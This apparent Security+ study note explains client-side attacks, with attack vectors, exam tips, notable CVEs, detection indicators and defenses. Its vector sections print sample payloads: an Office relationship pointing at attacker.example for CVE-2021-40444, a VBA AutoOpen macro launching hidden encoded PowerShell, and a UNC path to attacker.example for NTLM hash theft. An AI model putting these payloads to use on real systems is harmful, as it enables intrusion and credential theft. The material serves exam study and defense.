```markdown
---
domain: "offensive-security"
tags: [client-side, browser-exploitation, social-engineering, malware-delivery, web-security, security-plus]
---
# Client-Side Attack

A **client-side attack** is any exploit that targets the software running on the victim's machine — the browser, email client, document reader, or operating system — rather than attacking an exposed server directly. Unlike [[Server-Side Attack|server-side attacks]], where the adversary sends a malicious request to a listening service, client-side attacks require the victim's system to **process or execute attacker-controlled content**, often triggered through [[Social Engineering]] or a compromised web resource. Because modern defenses increasingly harden public-facing servers, client-side attacks have become the dominant initial-access vector in real-world intrusions.

---

## Overview

The fundamental premise of a client-side attack is that the target application — a browser rendering HTML, an Office suite parsing a `.docx`, a PDF viewer processing a font — contains a vulnerability or a feature (such as macros) that can be abused when the user opens or visits attacker-controlled content. The attacker does not need a routable path to the victim; they only need the victim to *pull* the malicious content, which is far easier to engineer through email, social media, or a compromised trusted website.

Client-side attacks exist because the attack surface of endpoint software is enormous and heterogeneous. Browsers alone parse HTML, CSS, JavaScript, WebAssembly, SVG, and dozens of media formats, each representing potential parsing or memory-corruption bugs. The same logic applies to document-processing ecosystems (Microsoft Office, LibreOffice, Adobe Acrobat) and media players. Crucially, each installed plugin, extension, or ActiveX control historically added its own attack surface — a lesson driven home by the decade-long wave of Java and Flash exploits.

The threat model is amplified by **social engineering**: even when no vulnerability exists, an attacker can coerce a user into enabling malicious macros, running a disguised executable, or entering credentials into a spoofed page. The Security+ exam explicitly links client-side attacks to the concept of **user execution** (MITRE ATT&CK T1204), where the human becomes part of the exploit chain. This makes purely technical defenses insufficient; user awareness training is a mandatory layer.

Real-world intrusion campaigns that began with client-side attacks include the 2014 Sony Pictures breach (spear-phishing), the 2020 SolarWinds supply chain attack (which relied partly on client-side implants post-compromise), and persistent nation-state campaigns using zero-click exploits against mobile devices. The Pegasus spyware framework (NSO Group) repeatedly demonstrated that client software can be exploited without any user interaction at all — a category called **zero-click attacks** — by triggering vulnerabilities in message-parsing code in iMessage or WhatsApp.

It is important to distinguish client-side *execution* from client-side *delivery*. [[Cross-Site Scripting (XSS)]], for example, is a vulnerability that lives in a server-side application (insufficient output encoding), but its payload executes inside the victim's browser — making it a client-side attack in terms of impact and detection location. This dual nature is a common exam gotcha. SQL injection, by contrast, executes entirely on the database server; the client is only a transport mechanism.

---

## How It Works

### General Attack Chain

Client-side attacks follow a consistent pattern regardless of the specific vector:

1. **Delivery** — The attacker crafts a payload and delivers it to the victim via phishing email, malicious advertisement, compromised website (watering hole), or social media link.
2. **Execution Trigger** — The victim's software loads the malicious content. This may require explicit user action (opening an attachment, clicking "Enable Content") or may happen automatically (drive-by download exploiting an unpatched browser).
3. **Exploitation / Code Execution** — The payload triggers a vulnerability (memory corruption, logic flaw) or abuses a legitimate feature (macros, DDE, NTLM authentication) to run attacker-controlled code in the context of the victim process.
4. **Privilege / Sandbox Escape (optional)** — If the exploit runs inside a browser sandbox or a low-integrity process, an additional stage escapes to a higher-privilege context.
5. **Payload Delivery & C2 Establishment** — A second-stage payload (Meterpreter, Cobalt Strike Beacon, custom implant) is downloaded and executed, establishing a [[Command and Control (C2)]] channel, typically over port 443 (HTTPS) to blend with normal traffic.

---

### Vector 1: Malicious Office Document (CVE-2021-40444)

CVE-2021-40444 is an MSHTML remote code execution vulnerability triggered when a victim opens a specially crafted `.docx` file. The document contains an OLE object that forces MSHTML to load a remote ActiveX control, executing arbitrary code without macros.

**Simplified delivery payload structure (conceptual)**:
```xml
<!-- Embedded relationship in word/_rels/document.xml.rels -->
<Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"
              Target="mhtml:http://attacker.example/payload.html!x-usc:http://attacker.example/payload.html"
              Id="rId1" TargetMode="External"/>
```

The victim opens the `.docx`; Word fetches and renders the remote HTML through the MSHTML engine; the ActiveX control is instantiated and executes a `.cab`-packaged malicious DLL. No macros. No "Enable Content" prompt on unpatched systems.

---

### Vector 2: Malicious Macro (VBA)

Macro-based attacks remain among the most common client-side vectors despite Microsoft's 2022 decision to block macros from internet-sourced documents by default.

```vba
' Minimal VBA macro — spawns a reverse shell via PowerShell
Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell -nop -w hidden -enc <Base64EncodedPayload>"
    Shell "cmd.exe /c " & cmd, vbHide
End Sub
```

The attacker embeds this in a `.doc` or `.xlsm` file and social-engineers the victim into clicking "Enable Content." Upon execution, PowerShell contacts the C2 server over port 443.

---

### Vector 3: Drive-By Download (Browser Exploit)

A [[Drive-by Download]] attack exploits a vulnerability in the browser or a plugin when the user visits a malicious or compromised page. The attacker hosts an **exploit kit** (historically Angler, RIG, Magnitude) that fingerprints the browser via JavaScript and serves the appropriate shellcode.

```
Victim browser → GET http://malicious-site.example/landing.php
                ← HTML + JS fingerprinter
Victim browser → GET http://malicious-site.example/exploit?ua=chrome&flash=0&jre=8u45
                ← CVE-specific heap spray / shellcode
Victim process  → executes shellcode → drops implant → beacons to C2:443
```

---

### Vector 4: NTLM Credential Leak (CVE-2023-23397)

This zero-click Outlook vulnerability requires no user interaction. A calendar invite with a crafted `PidLidReminderFileParameter` property pointing to an attacker-controlled UNC path (`\\attacker.example\share`) causes Outlook to authenticate automatically over SMB (port 445), leaking the victim's NTLMv2 hash.

```
Attacker sends calendar invite → Outlook parses UNC path → SMB auth to attacker:445
Attacker captures NTLMv2 hash via Responder or ntlmrelayx → cracks or relays hash
```

---

### Vector 5: Malvertising

[[Malvertising]] injects malicious ads into legitimate ad networks. The victim visits a trusted news site; the ad iframe loads attacker-controlled JavaScript that silently redirects to an exploit kit or installs a [[Drive-by Download]] without any clicks.

---

## Key Concepts

- **Drive-by Download**: Malware is silently downloaded and executed when a user visits a compromised or malicious website, requiring no explicit user consent beyond the page visit itself. Exploits unpatched browser or plugin vulnerabilities.

- **Watering Hole Attack**: The attacker identifies websites frequently visited by the intended target group (e.g., an industry forum), compromises those sites, and embeds a client-side exploit that runs when targets visit. Named by analogy to predators waiting at water sources.

- **Malvertising**: The abuse of online advertising networks to deliver malicious payloads through banner ads or video ads on otherwise-legitimate websites, bypassing the need to compromise the target site directly.

- **Zero-Click Exploit**: A client-side attack requiring absolutely no user interaction — the vulnerability is triggered by receiving a message, calendar invite, or other passively processed data. Examples include Pegasus/FORCEDENTRY (CVE-2021-30860) and CVE-2023-23397.

- **Browser Sandbox Escape**: Modern browsers isolate rendering processes in low-privilege sandboxes. A full browser exploit requires a second vulnerability — a **sandbox escape** — to break out of the sandboxed renderer and execute code with normal user or system privileges.

- **Social Engineering Vector**: The human layer of a client-side attack; the mechanism by which a user is persuaded to open a malicious file, click a link, or disable a security control. Techniques include urgency, authority impersonation, and pretexting.

- **Homograft / Typosquatting**: Registering domains visually or typographically similar to legitimate sites (`paypa1.com`, `micosoft.com`) to serve client-side exploits or credential-harvesting pages to users who mistype or are redirected.

- **Content Spoofing / Clickjacking**: Overlaying a legitimate page with an invisible malicious iframe so that the user's click is hijacked to perform an unintended action — a client-side attack that abuses the [[Same-Origin Policy]] enforcement gap.

---

## Exam Relevance

**SY0-701 Domain Mapping**: Client-side attacks appear primarily under **Domain 2.0 – Threats, Vulnerabilities, and Mitigations** and **Domain 4.0 – Security Operations**, particularly the application attack sub-objectives.

**High-Frequency Question Patterns**:
- Questions will describe a scenario (user visits a website and malware installs automatically) and ask you to identify the attack type. Answer: **drive-by download**.
- Scenarios describing an attacker compromising a website frequently visited by employees of a specific company point to **watering hole**, not phishing.
- Questions about XSS often ask where the malicious code executes — the answer is the **client's browser**, even though the vulnerability is in the server-side application.
- CSRF questions: the browser is weaponized to send authenticated requests the user did not intend; this is client-side *execution* but server-side *impact*.

**Common Gotchas**:
1. **XSS ≠ server-side attack**: The stored or reflected payload executes in the victim's browser. The *vulnerability* is server-side; the *attack impact* is client-side.
2. **Malvertising vs. watering hole**: Malvertising abuses ad networks on legitimate sites; watering hole *compromises* the legitimate site itself.
3. **Zero-click vs. one-click**: The exam may present a scenario where no user action triggered the compromise. Recognize this as zero-click / client-side passive exploitation.
4. **Macro attacks are social engineering + client-side exploitation**: They combine a client-side mechanism with a human manipulation component. Both halves matter.
5. **Drive-by downloads require an unpatched or misconfigured client**: If asked what prevents them, the answer includes patching, not just firewalls.

---

## Security Implications

### Vulnerabilities and Attack Vectors

Client-side attacks exploit software complexity at the endpoint, where defensive visibility is historically lower than at the network perimeter. Key vulnerability classes include:

- **Memory corruption** (use-after-free, heap spray, type confusion) in browser engines (V8, SpiderMonkey, WebKit) and document parsers.
- **Logic flaws** in authentication flows (OAuth misconfigurations leading to token theft in the browser).
- **Feature abuse** (macros, DDE, NTLM auto-authentication, CSS-based data exfiltration).
- **Supply chain compromise** leading to malicious JavaScript loaded by otherwise-safe pages (Magecart attacks).

### Notable CVEs and Incidents

| CVE | Component | Type | Impact |
|---|---|---|---|
| CVE-2021-40444 | MSHTML (Windows) | Drive-by via Office doc | Remote Code Execution, no macros required |
| CVE-2023-23397 | Microsoft Outlook | Zero-click calendar invite | NTLMv2 hash leak, credential theft |
| CVE-2021-30860 (FORCEDENTRY) | iOS iMessage | Zero-click PDF/JBIG2 | Full device compromise via Pegasus spyware |
| CVE-2016-0189 | Internet Explorer VBScript | Drive-by download | RCE, widely used by Angler exploit kit |
| CVE-2014-1776 | Internet Explorer | Use-after-free | RCE via watering hole campaigns |

### Detection Indicators

- Unusual child processes spawned by `winword.exe`, `excel.exe`, `acrord32.exe`, or browser processes (e.g., PowerShell, `cmd.exe`, `wscript.exe`).
- Outbound connections from Office or browser processes to non-CDN external IPs on port 443.
- SMB authentication events to external IPs (indicator of NTLM leak attacks).
- Browser-initiated DNS queries for domains with high entropy or recently registered (< 30 days).
- [[Endpoint Detection and Response (EDR)]] telemetry showing in-memory shellcode injection or reflective DLL loading.

---

## Defensive Measures

### Patch Management
The single highest-ROI control: most client-side exploits target *known* vulnerabilities. Maintain a ≤ 30-day patch cycle for browsers, Office, PDF readers, and media players. Use **Microsoft Update** for Office, enable **Chrome/Firefox auto-update**, and track [[CVE]] publications for installed software.

### Attack Surface Reduction (ASR) Rules
Enable Microsoft Defender's ASR rules to block:
```
- Block Office applications from creating child processes
- Block Office applications from injecting code into other processes
- Block executable content from email client and webmail
- Block Win32 API calls from Office macros
```
Group Policy path: `Computer Configuration → Administrative Templates → Windows Defender Exploit Guard → Attack Surface Reduction`

### Macro and Script Policy
- Since February 2022, Microsoft blocks VBA macros from internet-sourced files by default. Enforce this via Group Policy: `Block macros from running in Office files from the Internet`.
- Disable PowerShell v2 (`Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root`).
- Enable **Constrained Language Mode** for PowerShell via AppLocker or WDAC.

### Browser Hardening
- Deploy and enforce a strict [[Content Security Policy (CSP)]] on web applications to mitigate XSS.
- Enable **Site Isolation** (already default in Chrome/Edge): `chrome://flags/#enable-site-per-process`.
- Block malicious ads using DNS filtering (Pi-hole, Cisco Umbrella) and browser-level ad blockers.
- Disable legacy plugins; remove Java browser plugin entirely; never install Flash.
- Use **Browser-in-a-Browser (BitB)** awareness training; deploy anti-phishing browser extensions.

### Email Gateway Controls
- Configure mail gateways (Proofpoint, Microsoft Defender for Office 365) to strip or sandbox `.doc`, `.xlsm`, `.hta`, `.js`, and `.vbs` attachments.
- Enable **Safe Attachments** (detonation sandbox) and **Safe Links** (URL rewriting + scanning) in Microsoft 365 Defender.

### Network-Level Controls
- Block outbound SMB (port 445) to the internet at the perimeter firewall to prevent NTLM relay and hash-leaking attacks.
- Deploy a web proxy with SSL inspection to detect C2 beacon traffic masquerading as HTTPS.
- Implement [[DNS Filtering]] to block newly registered domains and known malicious infrastructure.

### User Awareness Training
- Conduct regular phishing simulations.
- Train users to recognize macro-enable prompts, unexpected file sources, and urgency-based social engineering.